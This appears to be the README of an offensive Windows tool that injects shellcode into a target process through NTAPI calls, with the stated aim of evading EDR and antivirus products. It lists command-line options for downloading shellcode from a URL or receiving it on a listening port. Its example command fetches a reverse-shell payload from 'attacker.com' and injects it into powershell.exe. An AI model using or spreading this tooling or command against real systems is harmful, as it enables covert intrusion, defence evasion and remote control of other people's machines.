# Windows NTAPI shellcode injector
Inject shellcode from memory to process using Windows NTAPI for bypassing EDRs and Antiviruses
- Download shellcode from URL
- Listen and wait for shellcode

## Usage

```shell
Usage:
        Injector.exe -u <URL>
        Injector.exe -p <PID/Process Name> -u <URL>
        Injector.exe -p <PID/Process Name> -l <LISTEN_PORT>
        Injector.exe -h
Options:
        -h       Show this menu.
        -u       URL to donwload shellcode from (Not listen mode).
        -p       PID/Process name to be injected (Optional).
        -l       Listen mode port (Not download mode).
```

compile using gcc/g++ or visual studio and run for example:

```shell
injector.exe -u http://attacker.com/reverse_shell.bin -p powershell.exe
```
